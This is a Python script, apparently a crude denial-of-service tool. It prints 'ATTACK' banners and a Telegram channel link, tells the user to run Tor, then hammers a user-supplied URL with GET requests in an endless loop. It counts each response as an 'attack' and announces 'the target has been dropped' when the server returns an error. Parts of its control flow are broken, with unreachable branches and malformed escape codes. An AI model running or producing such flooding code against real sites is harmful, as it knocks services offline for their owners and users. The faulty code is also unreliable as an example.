import requests,os,sys
os.system('clear')
print('''\033[1;32m
▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
░░░░▄▄███▄▄░░░░░█████░
''')
print('''\033[1;32m
█████████████████████████████████████
██▀▄─██─▄─▄─█─▄─▄─██▀▄─██─▄▄▄─█▄─█─▄█
██─▀─████─█████─████─▀─██─███▀██─▄▀██
▀▄▄▀▄▄▀▀▄▄▄▀▀▀▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
''')
print('''\033[1;32m
------------------------[~~~~~~~~~~~~~~~]-----------------------

                          [  SECURITY ]

                          [  WELCOME  ]

Telegram : https://t.me/protection17

------------------------[~~~~~~~~~~~~~~~]-----------------------
''')
print('\033[1;32m-'*50)
print('\033[1;32mMake sure TOR services are running ')
print('\033[1;32m-'*50)
at = str(input('\033[1;32mEnter web ○~~> :  '))
nob = 7
op = 0
while True :
		x = requests.get(at)
		if x.status_code == 200:
			op = op +1
			print(f'\33[1;31mattack : {op} ')
		elif x.status_code == 500:
			 os.system('clear')
			 print('\033[1;32m☆The target has been dropped☆ ')
			 print('\033[1;32Do you run tool')
			 co = input('\033[1;33m[ n / y ]○~~> : ')
			 if co == 'y':
			 	os.system('python3 attack.py')
			 if co == 'n':
			 	os.system('clear')
			 	os.system('cd')
			 	os.system('cd $HOME')
			 	os.system('python3 attack.py')
		elif x.status_code == 300:
			 os.system('clear')
			 print('\033[1;31m!server error')
			 print('\033[1;31m Do you run tool')
			 of = input('[ n / y ]○~~> : ')
			 if of == 'y':
			 	os.system('python3 attack.py')
			 if of == 'n':
			 	os.system('clear')
			 	os.system('cd')
			 	os.system('cd $HOME')
			 if x.status_code == 404:
			 	break
			 	os.system('clear')
			 	print('\033[1;34m!Error 404 You have been redirected to the link or a passage you are not authorized to pass ')
			 print('\033[1;35mDo you want run tool attack')
			 do = input('\033[1;32m[ n / y ] ○~~> : ')
			 if do == 'y':
			 	os.system('python3 attack.py')
			 if do == 'n':
			 	os.system('clear')
			 	os.system('cd')
			 	os.system('cd $HOME')
		elif x.status_code == 100:
			 print('wait')
		else:
			print('\033[1;31m-'*10)
			print('\033[1;31m!ERROR')
			print('\033[1;31m-'*10)
			break
			